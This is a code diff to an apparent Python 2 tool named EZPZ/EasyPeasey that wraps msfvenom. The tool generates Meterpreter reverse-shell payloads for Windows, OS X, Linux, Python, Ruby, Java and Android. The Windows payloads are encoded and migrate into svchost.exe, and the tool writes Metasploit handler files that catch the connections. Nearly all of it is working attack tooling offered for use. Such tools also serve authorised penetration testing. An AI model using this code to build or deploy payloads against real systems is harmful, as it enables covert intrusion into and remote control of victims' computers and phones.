@@ -78,9 +78,10 @@ encoder_Dict = {
 }
 
 payload_dir = '/root/EZPZ/payloads/'
+successful_payload_notice = colored('[!] Payload generation complete, check /root/EZPZ/payloads','green',attrs=['bold'])
 
 def test_Encoder_Effectiveness():
-    os.system('python /root/EZPZ/remoteexploits/encoder_Tester.py')
+    os.system('python /root/EZPZ/encoder_Tester.py')
     main()
 
 def Windows_INLINE():
@@ -103,7 +104,7 @@ def Windows_INLINE():
             payload_Set = opt_Dict[opt_Choice]
             user_input = payload_Parameters.from_input()
             bad_Bytes = "x00"
-            payload_file = payload_dir + user_input.output_payload
+            payload_file = payload_dir + user_input.output_payload + '.exe'
             cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} PrependMigrate=true PrependMigrateProc=svchost.exe -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
                 payload_Set,
                 user_input.LHOST,
@@ -116,10 +117,24 @@ def Windows_INLINE():
             )
             print colored(cmd_String,'red','on_white')
             os.system(cmd_String)
-
+            print successful_payload_notice
             # generate a handler file
             print 'Creating handler directory and generating handler file'
-            handler = open('/root/EZPZ/EasyPeasey_payload_handler.rc', 'w')
+# use multi/handler
+# set PAYLOAD windows/meterpreter/reverse_https
+# set LHOST 0.0.0.0
+# set LPORT 443
+# set ExitOnSession false
+# advanced
+# set EnableStageEncoding true
+# set StageEncoder x86/shitaka_ga_nai
+# set VERBOSE true
+# options
+# exploit -j -z
+            # handler_directory = '/root/EZPZ/payloads/'
+            # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
+            # handler_fullpath = handler_directory + handler_filename
+            handler = open('/root/EZPZ/payloads/EasyPeasey_payload_handler.rc', 'w')
 
             # write proper parameters to handler file
             text = 'Writing to handler file'
@@ -141,9 +156,9 @@ def Windows_INLINE():
             handler.write('\nset StageEncoder x86/shitaka_ga_nai')
             handler.write('\nset VERBOSE true')
             handler.write('\nexploit -j -z')
-            text = '[+] Handler file writing complete, find it at /root/EZPZ/EasyPeasey_payload_handler.rc'
+            text = '[+] Handler file writing complete, find it at /root/EZPZ/payloads/EasyPeasey_payload_handler.rc'
             print colored(text,'green',attrs=['bold'])
-            text = '[*] In Metasploit type "resource /root/EZPZ/EasyPeasey_payload_handler.rc" to automatically start the handler'
+            text = '[*] In Metasploit type "resource /root/EZPZ/payloads/EasyPeasey_payload_handler.rc" to automatically start the handler'
             print colored(text,'yellow',attrs=['bold'])
             handler.close()
         else:
@@ -174,7 +189,7 @@ def Windows_STAGED():
             print colored('Please answer the following questions','red','on_white')
             payload_Set = opt_Dict[opt_Choice]
             user_input = payload_Parameters.from_input()
-            payload_file = payload_dir + user_input.output_payload
+            payload_file = payload_dir + user_input.output_payload + '.exe'
             bad_Bytes = "x00"
             cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} PrependMigrate=true PrependMigrateProc=svchost.exe -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
                 payload_Set,
@@ -188,10 +203,14 @@ def Windows_STAGED():
             )
             print colored(cmd_String,'red','on_white')
             os.system(cmd_String)
+            print successful_payload_notice
             # generate a handler file
             print 'Creating handler directory and generating handler file'
             #
-            handler = open('/root/EZPZ/EasyPeasey_payload_handler.rc', 'w')
+            # handler_directory = '/root/EZPZ/payloads/'
+            # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
+            # handler_fullpath = handler_directory + handler_filename
+            handler = open('/root/EZPZ/payloads/EasyPeasey_payload_handler.rc', 'w')
 
             # write proper parameters to handler file
             text = 'Writing to handler file'
@@ -213,12 +232,11 @@ def Windows_STAGED():
             handler.write('\nset StageEncoder x86/shitaka_ga_nai')
             handler.write('\nset VERBOSE true')
             handler.write('\nexploit -j -z')
-            text = '[+] Handler file writing complete, find it at /root/EZPZ/EasyPeasey_payload_handler.rc'
+            text = '[+] Handler file writing complete, find it at /root/EZPZ/payloads/EasyPeasey_payload_handler.rc'
             print colored(text,'green',attrs=['bold'])
-            text = '[*] In Metasploit type "resource /root/EZPZ/EasyPeasey_payload_handler.rc" to automatically start the handler'
+            text = '[*] In Metasploit type "resource /root/EZPZ/payloads/EasyPeasey_payload_handler.rc" to automatically start the handler'
             print colored(text,'yellow',attrs=['bold'])
             handler.close()
-
         else:
             print colored('You have entered a invalid option','red','on_white')
             Windows_STAGED()
@@ -271,7 +289,7 @@ def OSX_PPC():
         payload_Set = opt_Dict[opt_Choice]
         user_input = payload_Parameters.from_input()
         bad_Bytes = "x00"
-        payload_file = payload_dir + user_input.output_payload
+        payload_file = payload_dir + user_input.output_payload + '.macho'
         cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
             payload_Set,
             user_input.LHOST,
@@ -284,9 +302,14 @@ def OSX_PPC():
         )
         print colored(cmd_String,'red','on_white')
         os.system(cmd_String)
+        print successful_payload_notice
         # generate a handler file
         print 'Creating handler directory and generating handler file'
-        handler = open('/root/EZPZ/EasyPeasey_payload_handler.rc', 'w')
+
+        # handler_directory = '/root/EZPZ/payloads/'
+        # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
+        # handler_fullpath = handler_directory + handler_filename
+        handler = open('/root/EZPZ/payloads/EasyPeasey_payload_handler.rc', 'w')
 
         # write proper parameters to handler file
         text = 'Writing to handler file'
@@ -308,12 +331,11 @@ def OSX_PPC():
         handler.write('\nset StageEncoder x86/shitaka_ga_nai')
         handler.write('\nset VERBOSE true')
         handler.write('\nexploit -j -z')
-        text = '[+] Handler file writing complete, find it at /root/EZPZ/EasyPeasey_payload_handler.rc'
+        text = '[+] Handler file writing complete, find it at /root/EZPZ/payloads/EasyPeasey_payload_handler.rc'
         print colored(text,'green',attrs=['bold'])
-        text = '[*] In Metasploit type "resource /root/EZPZ/EasyPeasey_payload_handler.rc" to automatically start the handler'
+        text = '[*] In Metasploit type "resource /root/EZPZ/payloads/EasyPeasey_payload_handler.rc" to automatically start the handler'
         print colored(text,'yellow',attrs=['bold'])
         handler.close()
-
 
     else:
         print colored('You have entered a invalid option','red','on_white')
@@ -342,7 +364,7 @@ def OSX_x86():
         payload_Set = opt_Dict[opt_Choice]
         user_input = payload_Parameters.from_input()
         bad_Bytes = "x00"
-        payload_file = payload_dir + user_input.output_payload
+        payload_file = payload_dir + user_input.output_payload + '.macho'
 
         cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
             payload_Set,
@@ -356,9 +378,11 @@ def OSX_x86():
         )
         print colored(cmd_String,'red','on_white')
         os.system(cmd_String)
+        print successful_payload_notice
+
         # generate a handler file
         print 'Creating handler directory and generating handler file'
-        handler = open('/root/EZPZ/EasyPeasey_payload_handler.rc', 'w')
+        handler = open('/root/EZPZ/payloads/EasyPeasey_payload_handler.rc', 'w')
 
         # write proper parameters to handler file
         text = 'Writing to handler file'
@@ -380,11 +404,15 @@ def OSX_x86():
         handler.write('\nset StageEncoder x86/shitaka_ga_nai')
         handler.write('\nset VERBOSE true')
         handler.write('\nexploit -j -z')
-        text = '[+] Handler file writing complete, find it at /root/EZPZ/EasyPeasey_payload_handler.rc'
+        text = '[+] Handler file writing complete, find it at /root/EZPZ/payloads/EasyPeasey_payload_handler.rc'
         print colored(text,'green',attrs=['bold'])
-        text = '[*] In Metasploit type "resource /root/EZPZ/EasyPeasey_payload_handler.rc" to automatically start the handler'
+        text = '[*] In Metasploit type "resource /root/EZPZ/payloads/EasyPeasey_payload_handler.rc" to automatically start the handler'
         print colored(text,'yellow',attrs=['bold'])
         handler.close()
+
+        # Inform user where the handler file is stored
+        print colored('Your handler file is located at /root/EZPZ/payloads/EasyPeasey_payload_handler.rc', 'red','on_white')
+        print 'To use, open msfconsole and type "resource <handlerfile.rc>"'
 
     else:
         print colored('You have entered a invalid option','red','on_white')
@@ -436,7 +464,7 @@ def Linux_STAGED():
         payload_Set = opt_Dict[opt_Choice]
         user_input = payload_Parameters.from_input()
         bad_Bytes = "x00"
-        payload_file = payload_dir + user_input.output_payload
+        payload_file = payload_dir + user_input.output_payload + '.elf'
 
         cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
             payload_Set,
@@ -450,9 +478,15 @@ def Linux_STAGED():
         )
         print colored(cmd_String,'red','on_white')
         os.system(cmd_String)
+        print successful_payload_notice
+
         # generate a handler file
         print 'Creating handler directory and generating handler file'
-        handler = open('/root/EZPZ/EasyPeasey_payload_handler.rc', 'w')
+
+        # handler_directory = '/root/EZPZ/payloads/'
+        # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
+        # handler_fullpath = handler_directory + handler_filename
+        handler = open('/root/EZPZ/payloads/EasyPeasey_payload_handler.rc', 'w')
 
         # write proper parameters to handler file
         text = 'Writing to handler file'
@@ -474,9 +508,9 @@ def Linux_STAGED():
         handler.write('\nset StageEncoder x86/shitaka_ga_nai')
         handler.write('\nset VERBOSE true')
         handler.write('\nexploit -j -z')
-        text = '[+] Handler file writing complete, find it at /root/EZPZ/EasyPeasey_payload_handler.rc'
+        text = '[+] Handler file writing complete, find it at /root/EZPZ/payloads/EasyPeasey_payload_handler.rc'
         print colored(text,'green',attrs=['bold'])
-        text = '[*] In Metasploit type "resource /root/EZPZ/EasyPeasey_payload_handler.rc" to automatically start the handler'
+        text = '[*] In Metasploit type "resource /root/EZPZ/payloads/EasyPeasey_payload_handler.rc" to automatically start the handler'
         print colored(text,'yellow',attrs=['bold'])
         handler.close()
 
@@ -495,7 +529,9 @@ def Platform_Linux():
         main()
     return
 
+python_warning_message = colored('Warning: May 5th,2017, Python payloads are found that it cannot be encoded or else it wont work "syntax error"\nYour payload will not be encoded','red',attrs=['bold'])
 def Python_INLINE():
+    print python_warning_message
     opt_Dict = {
         '1': 'python/meterpreter_reverse_tcp',
         '2': 'python/meterpreter_reverse_http',
@@ -512,36 +548,36 @@ def Python_INLINE():
     opt_Choice = str(raw_input("Enter a payload shown: "))
 
     if opt_Choice in opt_Dict:
-        os.system('cat /root/EZPZ/msfvenom_encoders.txt')
+        # os.system('cat /root/EZPZ/msfvenom_encoders.txt')
         print colored('Please answer the following questions','red','on_white')
         payload_Set = opt_Dict[opt_Choice]
-        user_input = payload_Parameters.from_input()
+        # python payloads have the same bugs as android, cannot be encoded or it wont work "syntax error"
+        # user_input = payload_Parameters.from_input()
         bad_Bytes = "x00"
-        payload_file = payload_dir + user_input.output_payload
+        LHOST_Set = str(raw_input("Enter LHOST: "))
+        LPORT_Set = str(raw_input("Enter LPORT: "))
+        payload_name = str(raw_input("Enter the name of the payload: "))
+        payload_file = payload_dir + payload_name + '.py'
 
-        # cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
-        #     payload_Set,
-        #     user_input.LHOST,
-        #     user_input.LPORT,
-        #     user_input.encoder,
-        #     user_input.encoder_iterations,
-        #     bad_Bytes,
-        #     user_input.output_format,
-        #     user_input.output_payload
-        # )
 
         cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -f {3} -o {4}""".format(
             payload_Set,
-            user_input.LHOST,
-            user_input.LPORT,
-            user_input.output_format,
+            LHOST_Set,
+            LPORT_Set,
+            'raw',
             payload_file
         )
         print colored(cmd_String,'red','on_white')
         os.system(cmd_String)
+        print successful_payload_notice
+
         # generate a handler file
         print 'Creating handler directory and generating handler file'
-        handler = open('/root/EZPZ/EasyPeasey_payload_handler.rc', 'w')
+
+        # handler_directory = '/root/EZPZ/payloads/'
+        # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
+        # handler_fullpath = handler_directory + handler_filename
+        handler = open('/root/EZPZ/payloads/EasyPeasey_payload_handler.rc', 'w')
 
         # write proper parameters to handler file
         text = 'Writing to handler file'
@@ -551,21 +587,21 @@ def Python_INLINE():
         # Well my other program DIAMONDSHARK showed that it uses + operators instead of %s and .format {}
         text = '[*] Writing handler file with following parameters:'
         print colored(text,'yellow',attrs=['bold'])
-        text = '[*] PAYLOAD = %s LHOST = 0.0.0.0 LPORT = %s ExitOnSession = false EnableStageEncoding = true StageEncoder = (default) x86/shitaka_ga_nai' % (payload_Set, user_input.LPORT)
+        text = '[*] PAYLOAD = %s LHOST = 0.0.0.0 LPORT = %s ExitOnSession = false EnableStageEncoding = true StageEncoder = (default) x86/shitaka_ga_nai' % (payload_Set, LPORT_Set)
         print colored(text,'yellow',attrs=['bold'])
         handler.write("\nset PAYLOAD " + payload_Set)
         # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
         handler.write('\nset LHOST 0.0.0.0')
         # handler.write("\nset LPORT {0}").format(user_input.LPORT)
-        handler.write("\nset LPORT " + user_input.LPORT)
+        handler.write("\nset LPORT " + LPORT_Set)
         handler.write('\nset ExitOnSession false')
         handler.write('\nset EnableStageEncoding true')
         handler.write('\nset StageEncoder x86/shitaka_ga_nai')
         handler.write('\nset VERBOSE true')
         handler.write('\nexploit -j -z')
-        text = '[+] Handler file writing complete, find it at /root/EZPZ/EasyPeasey_payload_handler.rc'
+        text = '[+] Handler file writing complete, find it at /root/EZPZ/payloads/EasyPeasey_payload_handler.rc'
         print colored(text,'green',attrs=['bold'])
-        text = '[*] In Metasploit type "resource /root/EZPZ/EasyPeasey_payload_handler.rc" to automatically start the handler'
+        text = '[*] In Metasploit type "resource /root/EZPZ/payloads/EasyPeasey_payload_handler.rc" to automatically start the handler'
         print colored(text,'yellow',attrs=['bold'])
         handler.close()
 
@@ -575,6 +611,7 @@ def Python_INLINE():
     main()
     return
 def Python_STAGED():
+    print python_warning_message
     opt_Dict = {
         '1': 'python/meterpreter/reverse_tcp',
         '2': 'python/meterpreter/reverse_http',
@@ -591,25 +628,36 @@ def Python_STAGED():
     opt_Choice = str(raw_input("Enter a payload shown: "))
 
     if opt_Choice in opt_Dict:
-        os.system('cat /root/EZPZ/msfvenom_encoders.txt')
+        # os.system('cat /root/EZPZ/msfvenom_encoders.txt')
         print colored('Please answer the following questions','red','on_white')
         payload_Set = opt_Dict[opt_Choice]
-        user_input = payload_Parameters.from_input()
+        # python payloads have the same bugs as android, cannot be encoded or it wont work "syntax error"
+        # user_input = payload_Parameters.from_input()
         bad_Bytes = "x00"
-        payload_file = payload_dir + user_input.output_payload
+        LHOST_Set = str(raw_input("Enter LHOST: "))
+        LPORT_Set = str(raw_input("Enter LPORT: "))
+        payload_name = str(raw_input("Enter the name of the payload: "))
+        payload_file = payload_dir + payload_name + '.py'
+
 
         cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -f {3} -o {4}""".format(
             payload_Set,
-            user_input.LHOST,
-            user_input.LPORT,
-            user_input.output_format,
+            LHOST_Set,
+            LPORT_Set,
+            'raw',
             payload_file
         )
         print colored(cmd_String,'red','on_white')
         os.system(cmd_String)
+        print successful_payload_notice
+
         # generate a handler file
         print 'Creating handler directory and generating handler file'
-        handler = open('/root/EZPZ/EasyPeasey_payload_handler.rc', 'w')
+
+        # handler_directory = '/root/EZPZ/payloads/'
+        # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
+        # handler_fullpath = handler_directory + handler_filename
+        handler = open('/root/EZPZ/payloads/EasyPeasey_payload_handler.rc', 'w')
 
         # write proper parameters to handler file
         text = 'Writing to handler file'
@@ -619,21 +667,21 @@ def Python_STAGED():
         # Well my other program DIAMONDSHARK showed that it uses + operators instead of %s and .format {}
         text = '[*] Writing handler file with following parameters:'
         print colored(text,'yellow',attrs=['bold'])
-        text = '[*] PAYLOAD = %s LHOST = 0.0.0.0 LPORT = %s ExitOnSession = false EnableStageEncoding = true StageEncoder = (default) x86/shitaka_ga_nai' % (payload_Set, user_input.LPORT)
+        text = '[*] PAYLOAD = %s LHOST = 0.0.0.0 LPORT = %s ExitOnSession = false EnableStageEncoding = true StageEncoder = (default) x86/shitaka_ga_nai' % (payload_Set, LPORT_Set)
         print colored(text,'yellow',attrs=['bold'])
         handler.write("\nset PAYLOAD " + payload_Set)
         # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
         handler.write('\nset LHOST 0.0.0.0')
         # handler.write("\nset LPORT {0}").format(user_input.LPORT)
-        handler.write("\nset LPORT " + user_input.LPORT)
+        handler.write("\nset LPORT " + LPORT_Set)
         handler.write('\nset ExitOnSession false')
         handler.write('\nset EnableStageEncoding true')
         handler.write('\nset StageEncoder x86/shitaka_ga_nai')
         handler.write('\nset VERBOSE true')
         handler.write('\nexploit -j -z')
-        text = '[+] Handler file writing complete, find it at /root/EZPZ/EasyPeasey_payload_handler.rc'
+        text = '[+] Handler file writing complete, find it at /root/EZPZ/payloads/EasyPeasey_payload_handler.rc'
         print colored(text,'green',attrs=['bold'])
-        text = '[*] In Metasploit type "resource /root/EZPZ/EasyPeasey_payload_handler.rc" to automatically start the handler'
+        text = '[*] In Metasploit type "resource /root/EZPZ/payloads/EasyPeasey_payload_handler.rc" to automatically start the handler'
         print colored(text,'yellow',attrs=['bold'])
         handler.close()
 
@@ -688,28 +736,36 @@ def Ruby_INLINE():
     opt_Choice = str(raw_input("Enter a payload shown: "))
 
     if opt_Choice in opt_Dict:
-        os.system('cat /root/EZPZ/msfvenom_encoders.txt')
+        # os.system('cat /root/EZPZ/msfvenom_encoders.txt')
         print colored('Please answer the following questions','red','on_white')
         payload_Set = opt_Dict[opt_Choice]
-        user_input = payload_Parameters.from_input()
+        # python payloads have the same bugs as android, cannot be encoded or it wont work "syntax error"
+        # user_input = payload_Parameters.from_input()
         bad_Bytes = "x00"
-        payload_file = payload_dir + user_input.output_payload
+        LHOST_Set = str(raw_input("Enter LHOST: "))
+        LPORT_Set = str(raw_input("Enter LPORT: "))
+        payload_name = str(raw_input("Enter the name of the payload: "))
+        payload_file = payload_dir + payload_name + '.rb'
 
-        cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
+
+        cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -f {3} -o {4}""".format(
             payload_Set,
-            user_input.LHOST,
-            user_input.LPORT,
-            user_input.encoder,
-            user_input.encoder_iterations,
-            bad_Bytes,
-            user_input.output_format,
+            LHOST_Set,
+            LPORT_Set,
+            'raw',
             payload_file
         )
         print colored(cmd_String,'red','on_white')
         os.system(cmd_String)
+        print successful_payload_notice
+
         # generate a handler file
         print 'Creating handler directory and generating handler file'
-        handler = open('/root/EZPZ/EasyPeasey_payload_handler.rc', 'w')
+
+        # handler_directory = '/root/EZPZ/payloads/'
+        # handler_filename = 'EasyPeasey_payload_handler.rc' # You cant use the metasploit payload anme as filename, because it is '/' syntax, cvausing errors
+        # handler_fullpath = handler_directory + handler_filename
+        handler = open('/root/EZPZ/payloads/EasyPeasey_payload_handler.rc', 'w')
 
         # write proper parameters to handler file
         text = 'Writing to handler file'
@@ -719,23 +775,24 @@ def Ruby_INLINE():
         # Well my other program DIAMONDSHARK showed that it uses + operators instead of %s and .format {}
         text = '[*] Writing handler file with following parameters:'
         print colored(text,'yellow',attrs=['bold'])
-        text = '[*] PAYLOAD = %s LHOST = 0.0.0.0 LPORT = %s ExitOnSession = false EnableStageEncoding = true StageEncoder = (default) x86/shitaka_ga_nai' % (payload_Set, user_input.LPORT)
+        text = '[*] PAYLOAD = %s LHOST = 0.0.0.0 LPORT = %s ExitOnSession = false EnableStageEncoding = true StageEncoder = (default) x86/shitaka_ga_nai' % (payload_Set, LPORT_Set)
         print colored(text,'yellow',attrs=['bold'])
         handler.write("\nset PAYLOAD " + payload_Set)
         # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
         handler.write('\nset LHOST 0.0.0.0')
         # handler.write("\nset LPORT {0}").format(user_input.LPORT)
-        handler.write("\nset LPORT " + user_input.LPORT)
+        handler.write("\nset LPORT " + LPORT_Set)
         handler.write('\nset ExitOnSession false')
         handler.write('\nset EnableStageEncoding true')
         handler.write('\nset StageEncoder x86/shitaka_ga_nai')
         handler.write('\nset VERBOSE true')
         handler.write('\nexploit -j -z')
-        text = '[+] Handler file writing complete, find it at /root/EZPZ/EasyPeasey_payload_handler.rc'
+        text = '[+] Handler file writing complete, find it at /root/EZPZ/payloads/EasyPeasey_payload_handler.rc'
         print colored(text,'green',attrs=['bold'])
-        text = '[*] In Metasploit type "resource /root/EZPZ/EasyPeasey_payload_handler.rc" to automatically start the handler'
+        text = '[*] In Metasploit type "resource /root/EZPZ/payloads/EasyPeasey_payload_handler.rc" to automatically start the handler'
         print colored(text,'yellow',attrs=['bold'])
         handler.close()
+
 
     else:
         print colored('You have entered a invalid option','red','on_white')
@@ -773,7 +830,7 @@ def Java_STAGED():
         payload_Set = opt_Dict[opt_Choice]
         user_input = payload_Parameters.from_input()
         bad_Bytes = "x00"
-        payload_file = payload_dir + user_input.output_payload
+        payload_file = payload_dir + user_input.output_payload + '.jar'
 
         cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
             payload_Set,
@@ -787,9 +844,13 @@ def Java_STAGED():
         )
         print colored(cmd_String,'red','on_white')
         os.system(cmd_String)
+        print successful_payload_notice
+
+        # Tell user where the payload is located
         # generate a handler file
         print 'Creating handler directory and generating handler file'
-        handler = open('/root/EZPZ/EasyPeasey_payload_handler.rc', 'w')
+
+        handler = open('/root/EZPZ/payloads/EasyPeasey_payload_handler.rc', 'w')
 
         # write proper parameters to handler file
         text = 'Writing to handler file'
@@ -811,9 +872,9 @@ def Java_STAGED():
         handler.write('\nset StageEncoder x86/shitaka_ga_nai')
         handler.write('\nset VERBOSE true')
         handler.write('\nexploit -j -z')
-        text = '[+] Handler file writing complete, find it at /root/EZPZ/EasyPeasey_payload_handler.rc'
+        text = '[+] Handler file writing complete, find it at /root/EZPZ/payloads/EasyPeasey_payload_handler.rc'
         print colored(text,'green',attrs=['bold'])
-        text = '[*] In Metasploit type "resource /root/EZPZ/EasyPeasey_payload_handler.rc" to automatically start the handler'
+        text = '[*] In Metasploit type "resource /root/EZPZ/payloads/EasyPeasey_payload_handler.rc" to automatically start the handler'
         print colored(text,'yellow',attrs=['bold'])
         handler.close()
 
@@ -828,7 +889,11 @@ def Platform_Java():
 
     return
 
+android_warning_message = colored('[-] Warning May 5th, 2017: Android Payloads are found to be unable to be encoded while allowing it to be installable("parse error")\nNo encoders will be used to generating payload','red',attrs=['bold'])
+
 def Android_INLINE():
+
+    print android_warning_message
     opt_Dict = {
         '1': 'android/meterpreter_reverse_tcp ',
         '2': 'android/meterpreter_reverse_http',
@@ -845,26 +910,30 @@ def Android_INLINE():
     opt_Choice = str(raw_input("Enter a payload shown: "))
 
     if opt_Choice in opt_Dict:
-        os.system('cat /root/EZPZ/msfvenom_encoders.txt')
+        # os.system('cat /root/EZPZ/msfvenom_encoders.txt')
         print colored('Please answer the following questions','red','on_white')
         payload_Set = opt_Dict[opt_Choice]
-        user_input = payload_Parameters.from_input()
+        # we cant use the ordinary class anymore, the android payloads are not designed to be encoded
+        # user_input = payload_Parameters.from_input()
         bad_Bytes = "x00"
-        payload_file = payload_dir + user_input.output_payload
+        LHOST_Set = str(raw_input("Enter LHOST, the connect-back host IP: "))
+        LPORT_Set = str(raw_input("Enter LPORT, the connect-back host Port: "))
+        payload_name = str(raw_input("What would you like to call your payload? "))
+        payload_file = payload_dir + payload_name + '.apk'
 
-        cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
+        cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -f raw -o {3}""".format(
             payload_Set,
-            user_input.LHOST,
-            user_input.LPORT,
-            user_input.encoder,
-            user_input.encoder_iterations,
-            bad_Bytes,
-            user_input.output_format,
+            LHOST_Set,
+            LPORT_Set,
             payload_file
         )
         print colored(cmd_String,'red','on_white')
         os.system(cmd_String)
-        handler = open('/root/EZPZ/EasyPeasey_payload_handler.rc', 'w')
+        print successful_payload_notice
+
+        # generate a handler file
+        print 'Creating handler directory and generating handler file'
+        handler = open('/root/EZPZ/payloads/EasyPeasey_payload_handler.rc', 'w')
 
         # write proper parameters to handler file
         text = 'Writing to handler file'
@@ -874,21 +943,21 @@ def Android_INLINE():
         # Well my other program DIAMONDSHARK showed that it uses + operators instead of %s and .format {}
         text = '[*] Writing handler file with following parameters:'
         print colored(text,'yellow',attrs=['bold'])
-        text = '[*] PAYLOAD = %s LHOST = 0.0.0.0 LPORT = %s ExitOnSession = false EnableStageEncoding = true StageEncoder = (default) x86/shitaka_ga_nai' % (payload_Set, user_input.LPORT)
+        text = '[*] PAYLOAD = %s LHOST = 0.0.0.0 LPORT = %s ExitOnSession = false EnableStageEncoding = true StageEncoder = (default) x86/shitaka_ga_nai' % (payload_Set, LPORT_Set)
         print colored(text,'yellow',attrs=['bold'])
         handler.write("\nset PAYLOAD " + payload_Set)
         # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
         handler.write('\nset LHOST 0.0.0.0')
         # handler.write("\nset LPORT {0}").format(user_input.LPORT)
-        handler.write("\nset LPORT " + user_input.LPORT)
+        handler.write("\nset LPORT " + LPORT_Set)
         handler.write('\nset ExitOnSession false')
         handler.write('\nset EnableStageEncoding true')
         handler.write('\nset StageEncoder x86/shitaka_ga_nai')
         handler.write('\nset VERBOSE true')
         handler.write('\nexploit -j -z')
-        text = '[+] Handler file writing complete, find it at /root/EZPZ/EasyPeasey_payload_handler.rc'
+        text = '[+] Handler file writing complete, find it at /root/EZPZ/payloads/EasyPeasey_payload_handler.rc'
         print colored(text,'green',attrs=['bold'])
-        text = '[*] In Metasploit type "resource /root/EZPZ/EasyPeasey_payload_handler.rc" to automatically start the handler'
+        text = '[*] In Metasploit type "resource /root/EZPZ/payloads/EasyPeasey_payload_handler.rc" to automatically start the handler'
         print colored(text,'yellow',attrs=['bold'])
         handler.close()
 
@@ -898,6 +967,8 @@ def Android_INLINE():
     main()
     return
 def Android_STAGED():
+
+    print android_warning_message
     opt_Dict = {
         '1': 'android/meterpreter/reverse_tcp ',
         '2': 'android/meterpreter/reverse_http',
@@ -913,28 +984,30 @@ def Android_STAGED():
     opt_Choice = str(raw_input("Enter a payload shown: "))
 
     if opt_Choice in opt_Dict:
-        os.system('cat /root/EZPZ/msfvenom_encoders.txt')
+        # os.system('cat /root/EZPZ/msfvenom_encoders.txt')
         print colored('Please answer the following questions','red','on_white')
         payload_Set = opt_Dict[opt_Choice]
-        user_input = payload_Parameters.from_input()
+        # user_input = payload_Parameters.from_input()
         bad_Bytes = "x00"
-        payload_file = payload_dir + user_input.output_payload
+        LHOST_Set = str(raw_input("Enter LHOST, the connect-back host IP: "))
+        LPORT_Set = str(raw_input("Enter LPORT, the connect-back host Port: "))
+        payload_name = str(raw_input("What would you like to call your payload? "))
+        payload_file = payload_dir + payload_name + '.apk'
 
-        cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
+        cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -f raw -o {3}""".format(
             payload_Set,
-            user_input.LHOST,
-            user_input.LPORT,
-            user_input.encoder,
-            user_input.encoder_iterations,
-            bad_Bytes,
-            user_input.output_format,
+            LHOST_Set,
+            LPORT_Set,
             payload_file
         )
         print colored(cmd_String,'red','on_white')
         os.system(cmd_String)
+        print successful_payload_notice
+
         # generate a handler file
         print 'Creating handler directory and generating handler file'
-        handler = open('/root/EZPZ/EasyPeasey_payload_handler.rc', 'w')
+
+        handler = open('/root/EZPZ/payloads/EasyPeasey_payload_handler.rc', 'w')
 
         # write proper parameters to handler file
         text = 'Writing to handler file'
@@ -944,21 +1017,21 @@ def Android_STAGED():
         # Well my other program DIAMONDSHARK showed that it uses + operators instead of %s and .format {}
         text = '[*] Writing handler file with following parameters:'
         print colored(text,'yellow',attrs=['bold'])
-        text = '[*] PAYLOAD = %s LHOST = 0.0.0.0 LPORT = %s ExitOnSession = false EnableStageEncoding = true StageEncoder = (default) x86/shitaka_ga_nai' % (payload_Set, user_input.LPORT)
+        text = '[*] PAYLOAD = %s LHOST = 0.0.0.0 LPORT = %s ExitOnSession = false EnableStageEncoding = true StageEncoder = (default) x86/shitaka_ga_nai' % (payload_Set, LPORT_Set)
         print colored(text,'yellow',attrs=['bold'])
         handler.write("\nset PAYLOAD " + payload_Set)
         # handler.write("\nset PAYLOAD {0}").format(str(payload_Set))
         handler.write('\nset LHOST 0.0.0.0')
         # handler.write("\nset LPORT {0}").format(user_input.LPORT)
-        handler.write("\nset LPORT " + user_input.LPORT)
+        handler.write("\nset LPORT " + LPORT_Set)
         handler.write('\nset ExitOnSession false')
         handler.write('\nset EnableStageEncoding true')
         handler.write('\nset StageEncoder x86/shitaka_ga_nai')
         handler.write('\nset VERBOSE true')
         handler.write('\nexploit -j -z')
-        text = '[+] Handler file writing complete, find it at /root/EZPZ/EasyPeasey_payload_handler.rc'
+        text = '[+] Handler file writing complete, find it at /root/EZPZ/payloads/EasyPeasey_payload_handler.rc'
         print colored(text,'green',attrs=['bold'])
-        text = '[*] In Metasploit type "resource /root/EZPZ/EasyPeasey_payload_handler.rc" to automatically start the handler'
+        text = '[*] In Metasploit type "resource /root/EZPZ/payloads/EasyPeasey_payload_handler.rc" to automatically start the handler'
         print colored(text,'yellow',attrs=['bold'])
         handler.close()
 
